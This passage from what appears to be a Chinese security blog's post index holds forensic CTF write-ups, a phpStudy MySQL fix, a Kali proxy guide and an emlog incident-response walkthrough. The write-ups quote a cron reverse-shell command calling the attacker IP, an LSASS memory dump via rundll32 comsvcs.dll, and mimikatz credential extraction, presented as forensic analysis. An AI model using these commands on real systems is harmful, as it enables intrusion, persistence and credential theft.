不发送第三次ACK，而是直接中断连接。\n由于连接未完全建立，目标系统不会记录完整会话，隐蔽性更强\n\n\n暴露服务信息：通过扫描结果，黑客可识别目标开放的端口及运行的服务（如HTTP、FTP），为后续攻击提供路径\n\n并且黑客在TCP SYN扫描中使用不含实际数据内容（Payload）的SYN包，是一种精心设计的协议层利用策略，其核心原因和原理如下:\n一、协议规范要求：SYN包本质是握手信号\nTCP三次握手的 第一次握手（SYN包） 在协议设计上仅用于建立连接协商，而非数据传输阶段。根据TCP&#x2F;IP协议规范：\n\nSYN包仅包含控制标志位和序列号：其作用是发起连接请求并同步初始序列号（ISN），无需携带应用层数据（如HTTP、FTP内容）。\n协议栈自动处理：操作系统网络栈在发送SYN包时，默认不附加Payload，因为连接尚未建立，传输数据无效。\n\n\n示例：Wireshark抓包显示，正常SYN包中”Data”字段长度为0。\n\n二、黑客的隐蔽性需求：规避检测和日志\n黑客刻意保持SYN包无内容，是为了最大化扫描的隐蔽性：\n\n规避入侵检测系统（IDS）：\n\n含Payload的SYN包（如填充虚假HTTP数据）会被识别为异常流量（如伪造攻击包）。\n空Payload的SYN包更接近合法握手流量，难以被Snort等IDS规则标记。\n\n\n避免系统日志记录：\n\n完整连接（如TCP Connect扫描）会在目标系统留下日志记录。\n\n半开扫描（SYN扫描）通过发送RST中断连接，无Payload的SYN包不会触发应用层日志，仅内核层可能记录。\n\n# Nmap SYN扫描命令：无Payload且不建立完整连接\nnmap -sS 192.168.1.1\n这里我们通过命令过滤完数据包后基本可以确定14.0.0.1为黑客的ip地址![image-20250803111634683](/img/image-20250803111634683.png)原因如下：1. 可以看到这个ip地址对多端口进行了扫描443，3306，22等一些常用端口   * ![image-20250803113813146](/img/image-20250803113813146.png)   * ![image-20250803113830063](/img/image-20250803113830063.png)   * ![image-20250803113846491](/img/image-20250803113846491.png)2. 他的窗口大小为1024符合攻击流量特征   * ![image-20250803114324621](/img/image-20250803114324621.png)3. 他的ack响应设置为0无响应，并且设置了RST标志位来强制终止连接，几乎无`SYN-ACK → ACK`的完整握手流符合恶意端口扫描特征   * ![image-20250803115110346](/img/image-20250803115110346.png)4. 这个ip的请求频率非常高   * ![image-20250803115700708](/img/image-20250803115700708.png)综上所述可以确定黑客的ip地址\n\n\n\n\n\nflag{14.0.0.120}\n**案例分析（ 典型攻击）**| **特征**      | **正常流量**       | **攻击流量**                    || ------------- | ------------------ | ------------------------------- || SYN请求频率   | 低频（1-5次/分钟） | 87次/5秒（密集爆发）            || 目标端口      | 固定（如443）      | 22,80,443,139,445...（15+端口） || TCP窗口大小   | &gt;16384             | 1024                            || SYN-ACK响应率 | &gt;90%               | 0%（无ACK响应）                 || 后续行为      | 建立TLS连接        | HTTP路径爆破                    |## 2.找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag&#123;城市英文小写&#125;将这个ip地址丢到工具查询后发现地址在广州工具:https://tool.lu/ip/![image-20250803134831729](/img/image-20250803134831729.png)\nflag{guangzhou}\n## 3.哪一个端口提供对web服务器管理面板的访问？ flag格式：flag&#123;2222&#125;对流量包进行过滤\nhttp &amp;&amp; ip.addr &#x3D;&#x3D; 14.0.0.120\n![image-20250803135306854](/img/image-20250803135306854.png)点开第一个进行http流追踪![image-20250803135751614](/img/image-20250803135751614.png)可以看到端口和tomcat版本信息\nflag{8080}\n## 4.经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag&#123;名称&#125;按照长度排序，在下面产生了大量的404请求![image-20250803140307432](/img/image-20250803140307432.png)右键http流追踪看看![image-20250803140356203](/img/image-20250803140356203.png)可以看到这里黑客使用的工具\nflag{gobuster}\n## 5.攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？继续分析流量包在下面翻到一个302跳转&gt; 302状态码表示**临时重定向**（Temporary Redirect），即请求的资源已被临时移动到新的URI地址、![image-20250803142313708](/img/image-20250803142313708.png)右键http追踪流分析一下往下划，前面的数据包都是401，从这里开始变为200 基本上可以确定这里是账号密码：YWRtaW46dG9tY2F0&lt;img src=&quot;/img/image-20250803140733868.png&quot; alt=&quot;image-20250803140733868&quot; style=&quot;zoom:50%;&quot; /&gt;拿去解密一下&lt;img src=&quot;/img/image-20250803140902922.png&quot; alt=&quot;image-20250803140902922&quot; style=&quot;zoom:50%;&quot; /&gt;\nflag{admin-tomcat}\n## 6.攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag&#123;114514.txt&#125;继续分析流量包，题目告诉我们登录成功在长度为712这里右键http流追踪![image-20250803144344994](/img/image-20250803144344994.png)点进去就发现这里上传了一个压缩包JXQOZY.war\nflag{JXQOZY.war}\n![image-20250803143806471](/img/image-20250803143806471.png)## 7.攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息**1.权限维持的本质**攻击者在成功提权后，需通过**持久化机制**确保权限不因系统重启或会话中断而丢失。常见手段包括：- 添加恶意定时任务（cron）- 植入启动脚本（rc.local/systemd）- 修改系统服务- 创建隐藏后门账户**2.流量分析的关键切入点**- **HTTP请求中的命令执行痕迹**：攻击者通过Web漏洞（如Tomcat上传漏洞）执行系统命令。- **反向Shell建立后的后续操作**：重点关注建立反弹Shell后的流量（如执行 `crontab` 命令）。- **协议特征**：过滤 `POST` 请求（上传文件）和包含 `/bin/bash`、`cron` 等关键词的流量。题目提示我们：某种任务里的信息我们先优先尝试**搜索定时任务（cron）的创建痕迹**\nhttp contains “crontab” || tcp contains “cron”  # 搜索cron相关流量\n![image-20250803150416934](/img/image-20250803150416934.png)果真查到了，将这三条命令整理一下\necho “* * * * * &#x2F;bin&#x2F;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;14.0.0.120&#x2F;443 0&gt;&amp;1’” &gt; cron.cronta b -i croncronta b -l cron\n该命令会创建每分钟执行一次的反向Shell，确保权限持久化\nflag{&#x2F;bin&#x2F;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;14.0.0.120&#x2F;443 0&gt;&amp;1’}\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"第六章-流量特征分析-蚂蚁爱上树","url":"/2025/09/16/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/","content":"第六章 流量特征分析-蚂蚁爱上树题目\n1. 管理员Admin账号的密码是什么？2. LSASS.exe的程序进程ID是多少？3. 用户WIN101的密码是什么?\n\n1. 管理员Admin账号的密码是什么？题目告诉我们管理员账户，我首先在wireshark里面搜索与Admin相关的关键字在4079这里追踪http流\n发现了蚁剑相关的流量特征，并且确定了黑客的内网ip地址和上传的shell，但是这里没有我相要的密码\n\n\n\n我们对黑客的上传的shell进行关键搜索,按照长度大小排序在长度为4146这里对这里进行base64解码得到黑客的操作信息\nhttp.request.method ==&quot;POST&quot; &amp;&amp; http contains &quot;product2.php&quot;\n\n\n条命令在 Windows 系统上执行了一系列操作，包括导航到特定目录并添加一个名为 admin 的用户，同时设置密码\n\nflag&#123;Password1&#125;\n\n2. LSASS.exe的程序进程ID是多少？在前面分析流量的时候在长度为4172这里得到了这么一行代码\n·~\\·m|···ol·cd /d &quot;C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop&quot;&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\\Temp\\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]\n\n\n\nLSASS.exe（Local Security Authority Subsystem Service，本地安全认证子系统服务）是Windows操作系统的核心系统进程，负责管理本地安全策略、用户登录认证、访问控制等关键安全功能。其重要性在于直接涉及系统安全机制，但也常被恶意软件伪装利用\n\n“rundll32.exe comsvcs.dll, MiniDump 852 C:\\Temp\\OnlineShopBackup.zip full”：\n\n功能：这是命令的核心部分，调用rundll32.exe（一个Windows系统工具）加载comsvcs.dll动态链接库中的MiniDump函数，以生成进程ID（PID）为852的完整内存转储文件，并保存为“C:\\Temp\\OnlineShopBackup.zip”。参数“full”指定转储类型为完整内存快照。\n详细解析：\nrundll32.exe：合法Windows二进制文件，用于运行DLL函数，但常被攻击者滥用。\ncomsvcs.dll：系统DLL文件，包含COM+服务功能；其MiniDump函数能创建进程内存转储。\nMiniDump：函数名，用于导出指定进程的内存数据。参数“852”是目标进程的PID（进程标识符），参数“C:\\Temp\\OnlineShopBackup.zip”是输出文件路径，参数“full”表示包含进程的所有内存信息（如敏感凭证）。\n\n\n安全含义：此操作常用于转储LSASS（Local Security Authority Subsystem Service）进程的内存，以窃取用户凭证（如密码）。LSASS存储登录信息，攻击者通过转储其内存并离线分析（如用Mimikatz工具）获取密码。证据显示，PID 852常指LSASS进程。\n\nflag&#123;852&#125;\n\n3.用户WIN101的密码是什么?这里我看了大佬的文章，因为上题C:\\Temp\\OnlineShopBackup.zip这里看到了zip就在流量包里面找zip结果没找到\n后面文章说已经在product2.php里面了，所以我们在这里找那个是有dmp文件的product2.php文件了\n我们在文件-&gt;导出-&gt;http -&gt;搜product2.php文件然后找dmp文件\n\ndmp文件大小特点：文件的大小，主要取决于你想保存多少信息，最小几百 KB，最大可达整个物理内存的大小（数 GB）。\n\n\n\n类型\n大小特点\n内容概述\n\n\n\n小型转储（Minidump）\n较小，通常为几百 KB 到几十 MB\n包含线程、模块、异常、堆栈等简要信息\n\n\n完整用户转储（Full User Dump）\n较大，可能为 数百 MB 到数 GB\n包含整个进程的所有虚拟内存内容\n\n\n内核转储（Kernel Dump）\n较大，通常为 200MB 到 1GB\n包含内核空间和驱动等\n\n\n完整系统转储（Complete Dump）\n非常大，可达 系统内存大小（RAM）的一倍\n包括全部内存数据，最详尽\n\n\n最后在这个为47mb这里找到了文件，将它保存下来用010打开\n\n010打开发现明显的头部特征，删除并且Ctrl+s进行保存（后缀格式为dmp）\n\n改完之后为这样\n\n使用工具“mimikatz”分析dmp文件中MD5密码的值，分析的dmp文件放在同一目录下\n\n使用命令开始分析\nsekurlsa::minidump product2.dmpsekurlsa::logonpasswords\n\n\nPrimary: [00000003]\n\n表示主要的认证信息。\n\nNTLM: 282d975e35846022476068ab5a3d72df\n\n这是用户的NTLM（NT LAN Manager）哈希值。NTLM哈希值是Windows系统中用于身份验证的密码哈希。（MD5）\n\n最后拿去网站解密https://www.somd5.com/\n\nflag&#123;admin#123&#125;\n\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"记录一次解决phpstudy启动数据库自动关闭的问题方法","url":"/2025/09/16/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E8%A7%A3%E5%86%B3phpstudy%E5%90%AF%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E8%87%AA%E5%8A%A8%E5%85%B3%E9%97%AD%E7%9A%84%E9%97%AE%E9%A2%98%E6%96%B9%E6%B3%95/","content":"记录一次解决phpstudy启动数据库自动关闭的问题方法\n问题一：\nMySQL无法启动可能是端口号被占用，可以进入配置文件进行修改端口号，D:\\phpstudy_pro\\Extensions\\MySQL5.5.29的my.ini配置文件，修改你的端口号（不建议）\n\n\n\n\n\n问题二若系统之前安装了mysql，则可能是phpStudy的服务与自己之前安装的mysql服务器方式冲突。\n解决方法：先把PHPStudy的服务打开，其次关闭本身的mysql服务。\n\n问题三\n我们打开mysql日志文件在此路径下F:\\phpstudy_pro\\Extensions\\MySQL5.7.26，找到data.err文件\n\n根据提供的错误日志和证据，问题核心在于MySQL的InnoDB存储引擎无法初始化，原因是系统表空间文件 ibdata1 缺乏写入权限\n\n定位ibdata1文件路径\n默认路径可能是：\n\n\n\n\nWindows（phpStudy环境）：phpStudy安装目录\\MySQL\\data\\ibdata1\n\nLinux：\n/var/lib/mysql/ibdata1\n\n 或自定义的\ndatadir\n\n目录\n\n通过MySQL配置文件（my.ini或my.cnf）确认datadir参数值，找到文件位置。\n\n\n\n\n修改文件权限和所有权\nWindows：\n\n\n\n\n右键点击ibdata1文件 → 属性 → 安全 → 确保NETWORK SERVICE或mysql用户有完全控制权限。\n然后重启phpstudy\n\n\n\n\n发现已经可以启动了\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"记录小白第一次配置kali的代理","url":"/2025/09/16/%E8%AE%B0%E5%BD%95%E5%B0%8F%E7%99%BD%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%85%8D%E7%BD%AEkali%E7%9A%84%E4%BB%A3%E7%90%86/","content":"记录小白第一次配置kali的代理起因是我要配置去使用kali下载一些东西，用kali虚拟机配置物理机的clash verg代理，然后就翻阅网上找文章学习如何配置也踩了不少坑记录一下\n1.物理机配置（Clash Verge）\n在设置里面确保Clash Verge已开启局域网代理功能这个很重要不开启无法链接\n\n给你们看一下开启前和开启后的对比\n\n相比起之前的 **“Failed to connect”**现在已经能连上 192.168.1.102:7897 端口了（网络层是通的 ）\n\n2.物理机端口设置（Clash Verge）\n在不同的代理软件里面HTTP代理端口port和SOCKS5代理端口（socks-port）是不一样的\n\n有的版本直接只显示 mixed-port（混合端口，支持 HTTP + SOCKS5，一般默认 7890）在这里我是7897\n\n在代理软件里面的设置里面可以查看\n\nport: 7890        # HTTP\nsocks-port: 7891  # SOCKS5\nmixed-port: 7890  # 有时只有这一项\n## 3.虚拟机的设置* 在虚拟里面建议将网卡设置为桥接模式如果使用NAT模式可能要进行端口转发，使用桥接然后虚拟机和物理机处于同一网段里面这样的话* **Windows 物理机**已经在运行 Clash Verge，它就是“代理网关”。* **Kali 虚拟机**只要能把流量交给 Windows 这台“网关”，就能上外网了* ```  export http_proxy=http://192.168.1.102:7890  export https_proxy=http://192.168.1.102:7890  export all_proxy=socks5://192.168.1.102:7891  # 前提：你的虚拟机网络模式要能访问物理机 IP（桥接模式一定能，NAT 模式需要配置端口转发）\n\n\n\n\n\n\n提醒：物理机上面开了代理我虚拟机里面的export https_proxy&#x3D;http://127.0.0.1:7890\n\n如果你只在 物理机 (Windows) 上开了代理，Kali 里面访问 127.0.0.1:7890 是无效的（因为那是 Kali 自己的环回地址，根本没有 Clash 在监听）\n\n这里连接上的是物理机的ip地址\n\n\n最后使用命令测试是否成功如果能返回 200 OK，就说明通了\ncurl -I https://google.com   \n\n\n扩展1.通过环境变量设置（临时&#x2F;终端代理）适用于终端命令（curl、wget、apt），但不影响 GUI 应用。\n# 设置 HTTP/HTTPS 代理export http_proxy=&quot;http://代理IP:端口&quot;export https_proxy=&quot;http://代理IP:端口&quot;# 设置 SOCKS5 代理（如 Shadowsocks）export socks_proxy=&quot;socks5://代理IP:端口&quot;# 测试代理是否生效curl -I https://google.com  \n\n取消代理：\nunset http_proxyunset https_proxyunset all_proxy\n\n2.proxychains（强制所有流量走代理）proxychains 是一个 强制代理工具，它通过 LD_PRELOAD 注入库 的方式，把所有应用的 connect() 系统调用劫持到代理上。\n\n适用场景：\n程序 不支持代理（如 nmap、ssh、sqlmap、某些 CTF 工具）。\n你要用 socks5 代理隧道 来跑端口扫描、爆破、渗透测试流量。\n渗透测试中需要把某些“裸连”的工具流量强制丢进代理（例如 VPN + socks5 结合）。\n\n\n优点：几乎可以代理任何程序的网络流量。\n缺点：\n可能导致一些程序运行不稳定（特别是多线程应用）。\n不支持 UDP 流量（比如 DNS、VoIP 就没法用）\n\n\n\n# 1.在 Kali 或 Ubuntu 上一般自带了，如果没有就装一下：sudo apt updatesudo apt install proxychains4 -y# 2.主要配置文件在：/etc/proxychains.conf/etc/proxychains4.conf# 3. 编辑配置文件：sudo nano /etc/proxychains4.conf找到最后的 代理服务器配置部分，默认可能有：socks4  127.0.0.1 9050改成你的 Clash Verge 端口（7897，一般是 socks5）：socks5  127.0.0.1 7897保存退出（Ctrl+O → 回车 → Ctrl+X）。# 4. 运行命令时，在前面加 proxychains 就行：测试代理是否成功proxychains curl http://ipinfo.io/ip能看到你代理出口的 IP（不是你本地 IP）。SSH 走代理proxychains ssh user@target.comNmap 扫描走代理proxychains nmap -sT -Pn target.comSqlmap 渗透测试走代理proxychains sqlmap -u &quot;http://target.com/vuln.php?id=1&quot; --dbs\n\n问题有的小伙伴可以会问要是自己物理机上面有clash verg我还有必要在虚拟机上面再安装 Clash 内核吗？\n你 只在以下情况才需要在虚拟机里单独跑 Clash 内核：\n\n你希望虚拟机可以独立使用代理，不依赖物理机；\n你要在虚拟机里跑透明代理（tun 模式）来劫持所有流量；\n你经常会把虚拟机拿到别的电脑上跑，不方便一直连物理机的代理；\n你需要在虚拟机内切换不同的代理配置文件（物理机 Clash Verge 的规则不满足需求）。\n\n建议\n\n如果你只是偶尔在虚拟机里需要上外网（比如更新 Kali、访问 Google、跑 TryHackMe），没必要再装 Clash 内核，直接用物理机的就行。\n如果你虚拟机要长期独立运行、或者物理机关了代理虚拟机也要能上网，那么 安装一个虚拟机自己的 Clash 内核比较合适。\n\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"第四章 windows实战-emlog wp","url":"/2025/09/16/%E7%AC%AC%E5%9B%9B%E7%AB%A0%20windows%E5%AE%9E%E6%88%98-emlog%20wp/","content":"第四章 windows实战-emlog wp服务器场景操作系统 Windows服务器账号密码 administrator xj@123456题目来源公众号 知攻善防实验室 https://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA任务环境说明    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！    应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查开放题目    漏洞修复参考https://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg\n\n题目\n通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;\n使用远程桌面链接靶机\n\n\n输入账号密码\n\n\n第一题通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;\n\n来到桌面发现这里有phpstudy \n\nphpstudy 是一个集成了 Apache&#x2F;Nginx + PHP + MySQL + phpMyAdmin 等组件的本地 Web 开发环境，是用来在本地电脑上快速搭建 PHP 网站运行环境的工具\n\n我们先从这里入手，题目告诉我们找shell我们就使用D盾去查杀www目录\n\n是你所有网站程序的默认根目录，所有 PHP 项目都要放在这里才能运行\n\n\n找到shell.php的路径，打开看看文件\n\n根据文件可以看到黑客的密码是rebeyod\nflag&#123;rebeyod&#125;\n\n\n\n\n第二题通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;\n让我们分析IP，一般来说直接看日志即可，日志里面记录了IP地址\n找到apache的日志\n\n通过日志分析可以看到192.168.126.1这个IP地址对/content/plugins/tips/shell.php 进行了多次请求可以判定，这个ip为黑客的IP地址作为flag提交\nflag&#123;192.168.126.1&#125;\n\n\n\n\n第三题通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;\n这里找黑客的隐藏账户，直接在搜索这里搜索 计算机组管理 然后在用户这里发现黑客的账户名\nflag&#123;hacker138&#125;\n\n\n第四题通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;\n让我们找出黑客的挖矿池域名，我们对黑客的账户文件进行检索，最后在桌面下面找到了挖矿程序\n\n我们直接使用脚本工具“pyinstxtractor.py”把kuang.exe转换成pyc文件，接着随便找一个pyc在线反编译即可发现池域名；\n\n\n将这个挖矿程序导出导自己有pyinstxtractor.py的文件下面然后在这个文件夹打开cmd输入命令\npython pyinstxtractor.py kuang.exe\n\n\n即可在文件家里面生成一个**Kuang.exe_extracted”文件\n\n打开找到这个文件名用notpad打开或者上传的在线网站**pyc在线反编译**\n\n得到域名：http://wakuang.zhigongshanfang.top\nflag&#123;http://wakuang.zhigongshanfang.top&#125;\n\n\n最后感谢大佬：https://blog.csdn.net/administratorlws/article/details/140125250\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]}]